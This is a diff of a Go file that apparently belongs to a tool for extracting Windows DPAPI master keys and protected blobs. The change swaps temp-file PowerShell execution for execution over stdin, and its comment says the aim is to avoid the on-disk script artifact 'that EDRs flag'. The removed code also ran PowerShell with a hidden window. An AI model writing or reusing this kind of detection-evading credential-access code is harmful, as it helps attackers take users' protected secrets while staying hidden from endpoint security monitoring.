@@ -7,7 +7,6 @@ import (
 	"encoding/base64"
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 )
@@ -52,32 +51,12 @@ func dpapiMasterKey() (string, error) {
 	return result, nil
 }
 
-// runPowerShellScript executes a PowerShell script from a throwaway temp file
-// instead of passing it (and any embedded secrets, e.g. a DPAPI blob in base64)
-// on the process command line, which would otherwise be visible to other local
-// users via process enumeration (C5). The temp file is removed immediately
-// after execution.
+// runPowerShellScript executes a PowerShell script via STDIN (runPowerShellStdin)
+// instead of writing a .ps1 to disk. This keeps DPAPI blobs and other embedded
+// secrets out of the filesystem and off powershell.exe's command line (C5),
+// avoiding the on-disk PS1 artifact that EDRs flag.
 func runPowerShellScript(script string) (string, error) {
-	f, err := os.CreateTemp("", "fc2-dpapi-*.ps1")
-	if err != nil {
-		return "", fmt.Errorf("create temp script: %v", err)
-	}
-	tmp := f.Name()
-	defer os.Remove(tmp)
-	if _, err := f.WriteString(script); err != nil {
-		f.Close()
-		return "", fmt.Errorf("write temp script: %v", err)
-	}
-	if err := f.Close(); err != nil {
-		return "", fmt.Errorf("close temp script: %v", err)
-	}
-	c := exec.Command("powershell", "-NoP", "-NonI", "-File", tmp)
-	applyHideWindow(c)
-	out, err := c.CombinedOutput()
-	if err != nil {
-		return "", fmt.Errorf("powershell: %v", err)
-	}
-	return string(out), nil
+	return runPowerShellStdin(script)
 }
 
 func dpapiBlob(filePath string) (string, error) {
